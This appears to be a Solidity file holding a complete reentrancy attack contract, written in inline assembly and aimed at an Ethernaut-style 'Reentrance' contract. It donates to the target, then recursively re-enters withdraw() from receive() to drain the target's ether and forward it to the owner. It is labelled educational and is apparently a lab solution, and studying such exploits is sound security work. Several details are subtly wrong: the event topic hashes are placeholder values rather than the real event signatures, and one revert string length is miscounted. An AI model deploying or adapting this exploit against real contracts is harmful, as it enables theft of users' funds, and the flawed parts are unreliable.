// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
 * @title ReentrancyAssemblyAttack
 * @notice Pure assembly implementation of reentrancy attack
 * @dev Every function uses inline assembly for maximum learning
 * FOR EDUCATIONAL PURPOSES ONLY
 */
contract ReentrancyAssemblyAttack {
    // Storage layout (slots):
    // 0: owner
    // 1: targetContract
    // 2: attackAmount
    // 3: maxIterations
    // 4: iterationCount
    // 5: stopped flag
    
    event AttackInitiated(address indexed target, uint256 amount);
    event ReentrancyTriggered(uint256 iteration, uint256 balance);
    event AttackCompleted(uint256 totalStolen, uint256 iterations);

    /**
     * @notice Constructor - Pure assembly implementation
     */
    constructor() {
        assembly {
            // Store msg.sender as owner at slot 0
            sstore(0, caller())
            
            // Initialize maxIterations to 50 (safety limit)
            sstore(3, 50)
            
            // Initialize iterationCount to 0
            sstore(4, 0)

            // Initialize stopped flag to 0 (active)
            sstore(5, 0)
        }
    }

    /**
     * @notice Donate ETH using pure assembly
     * @param target The Reentrance contract address
     */
    function donate(address target) external payable {
        assembly {
            // Disallow interactions once stopped
            if iszero(iszero(sload(5))) {
                revert(0, 0)
            }

            // Ensure msg.value > 0
            if iszero(callvalue()) {
                // Revert with "No ETH sent"
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 11)
                mstore(add(ptr, 0x44), "No ETH sent")
                revert(ptr, 0x64)
            }
            
            // Store target contract address (slot 1)
            sstore(1, target)
            
            // Store attack amount (slot 2)
            sstore(2, callvalue())
            
            // Reset iteration counter
            sstore(4, 0)
            
            // Prepare call to donate(address)
            // Function selector: keccak256("donate(address)") = 0x00362a95
            let ptr := mload(0x40)
            mstore(ptr, 0x00362a9500000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 0x04), address())  // Donate to this contract
            
            // Call target.donate{value: msg.value}(address(this))
            let success := call(
                gas(),          // Forward all gas
                target,         // Target address
                callvalue(),    // Send msg.value
                ptr,            // Input data location
                0x24,           // Input size: 4 + 32 bytes
                0x00,           // Output location
                0x00            // Output size
            )
            
            if iszero(success) {
                // Revert if donation failed
                revert(0, 0)
            }
            
            // Emit AttackInitiated event
            // Event signature: AttackInitiated(address,uint256)
            let eventPtr := mload(0x40)
            mstore(eventPtr, target)
            mstore(add(eventPtr, 0x20), callvalue())
            log1(
                eventPtr, 
                0x40,
                0xb58419f0c3fa7c502b7c49dd4a8b5e6a8e5c2d8d9e4e6c3e8a7c5b4d3e2f1a0b
            )
        }
    }

    /**
     * @notice Launch the reentrancy attack - Pure assembly
     */
    function attack() external {
        assembly {
            // Disallow interactions once stopped
            if iszero(iszero(sload(5))) {
                revert(0, 0)
            }

            // Load target and amount from storage
            let target := sload(1)
            let amount := sload(2)
            
            // Ensure we have a target set
            if iszero(target) {
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 13)
                mstore(add(ptr, 0x44), "No target set")
                revert(ptr, 0x64)
            }
            
            // Ensure we have donated
            if iszero(amount) {
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 18)
                mstore(add(ptr, 0x44), "Must donate first")
                revert(ptr, 0x64)
            }
            
            // Prepare withdraw(uint256) call
            // Function selector: keccak256("withdraw(uint256)") = 0x2e1a7d4d
            let ptr := mload(0x40)
            mstore(ptr, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 0x04), amount)
            
            // Call target.withdraw(amount)
            let success := call(
                gas(),      // Forward all gas
                target,     // Target contract
                0,          // No ETH sent
                ptr,        // Input location
                0x24,       // Input size: 4 + 32 bytes
                0x00,       // Output location
                0x00        // Output size
            )
            
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    /**
     * @notice Receive function - The reentrancy magic in pure assembly!
     */
    receive() external payable {
        assembly {
            // Abort if contract has been stopped
            if iszero(iszero(sload(5))) {
                stop()
            }

            // Load target contract and attack amount
            let target := sload(1)
            let amount := sload(2)
            let maxIter := sload(3)
            let iterCount := sload(4)
            let newIter := add(iterCount, 1)

            // Abort if we would exceed the configured limit
            if gt(newIter, maxIter) {
                sstore(4, maxIter)
                stop()
            }

            // Persist incremented iteration count
            sstore(4, newIter)
            iterCount := newIter
            
            // Log reentrancy triggered
            let eventPtr := mload(0x40)
            mstore(eventPtr, newIter)
            mstore(add(eventPtr, 0x20), balance(target))
            log1(
                eventPtr,
                0x40,
                0xc1e2d3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
            )
            
            // Safety check: prevent infinite loop
            // Check if target still has enough balance
            let targetBalance := balance(target)
            
            // If target has enough balance, attack again!
            if iszero(lt(targetBalance, amount)) {
                // Prepare withdraw(uint256) call
                let ptr := mload(0x40)
                mstore(ptr, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), amount)
                
                // Recursive call - THE REENTRANCY!
                let success := call(
                    gas(),      // Forward remaining gas
                    target,     // Target contract
                    0,          // No ETH sent
                    ptr,        // Input location
                    0x24,       // Input size
                    0x00,       // Output location
                    0x00        // Output size
                )
                
                // If call fails, we're done (target likely empty)
                if iszero(success) {
                    stop()
                }
            }
            
            // If we can't attack anymore, log completion
            if lt(targetBalance, amount) {
                // Calculate total stolen
                let totalStolen := selfbalance()
                
                // Emit AttackCompleted event
                let ptr := mload(0x40)
                mstore(ptr, totalStolen)
                mstore(add(ptr, 0x20), iterCount)
                log1(
                    ptr,
                    0x40,
                    0xd2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3
                )
            }
        }
    }

    /**
     * @notice Withdraw stolen funds - Pure assembly
     */
    function withdraw() external {
        assembly {
            // Halt withdrawals once stopped
            if iszero(iszero(sload(5))) {
                revert(0, 0)
            }

            let owner := sload(0)
            let msgSender := caller()
            
            if iszero(eq(msgSender, owner)) {
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 9)
                mstore(add(ptr, 0x44), "Not owner")
                revert(ptr, 0x64)
            }
            
            let amount := selfbalance()
            
            let success := call(
                gas(),      // Forward all gas
                msgSender,  // Send to caller (owner)
                amount,     // Send all balance
                0,          // No input data
                0,          // No input size
                0,          // No output data
                0           // No output size
            )
            
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    /**
     * @notice Get target balance - Pure assembly
     */
    function getTargetBalance() external view returns (uint256 bal) {
        assembly {
            let target := sload(1)
            bal := balance(target)
        }
    }

    /**
     * @notice Get iteration count - Pure assembly
     */
    function getIterationCount() external view returns (uint256 count) {
        assembly {
            count := sload(4)
        }
    }

    /**
     * @notice Get attack stats - Pure assembly
     */
    function getAttackStats() external view returns (
        address target,
        uint256 amount,
        uint256 iterations,
        uint256 stolen,
        uint256 targetBalance
    ) {
        assembly {
            // Load from storage
            target := sload(1)
            amount := sload(2)
            iterations := sload(4)
            stolen := selfbalance()
            targetBalance := balance(sload(1))
            
            // Return using memory
            mstore(0x00, target)
            mstore(0x20, amount)
            mstore(0x40, iterations)
            mstore(0x60, stolen)
            mstore(0x80, targetBalance)
            return(0x00, 0xa0)
        }
    }

    /**
     * @notice Emergency stop - Pure assembly
     * @dev Destroys contract and sends funds to owner
     */
    function emergencyStop() external {
        assembly {
            let owner := sload(0)
            
            if iszero(eq(caller(), owner)) {
                revert(0, 0)
            }

            // Mark contract as stopped and wipe critical state
            sstore(5, 1)
            sstore(1, 0)
            sstore(2, 0)
            sstore(4, 0)
            
            // Self-destruct and send funds to owner
            selfdestruct(owner)
        }
    }

    /**
     * @notice Calculate function selector - Educational helper
     * @param signature Function signature string
     * @return selector The 4-byte function selector
     */
    function calculateSelector(string memory signature) external pure returns (bytes4 selector) {
        bytes memory sigBytes = bytes(signature);
        bytes32 hashed;
        assembly {
            // Hash the signature bytes and expose the result to Solidity
            hashed := keccak256(add(sigBytes, 0x20), mload(sigBytes))
        }
        // forge-lint: disable-next-line(unsafe-typecast) -- grabbing the first four bytes of a keccak hash matches Solidity's selector derivation
        selector = bytes4(hashed);
    }

    /**
     * @notice Encode function call - Educational helper
     * @return data Encoded function call
     */
    function encodeWithdrawCall(uint256 amount) external pure returns (bytes memory data) {
        assembly {
            // Allocate memory for return data
            data := mload(0x40)
            
            // Store length (36 bytes: 4 selector + 32 amount)
            mstore(data, 0x24)
            
            // Store selector
            mstore(add(data, 0x20), 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
            
            // Store amount
            mstore(add(data, 0x24), amount)
            
            // Update free memory pointer
            mstore(0x40, add(data, 0x44))
        }
    }
}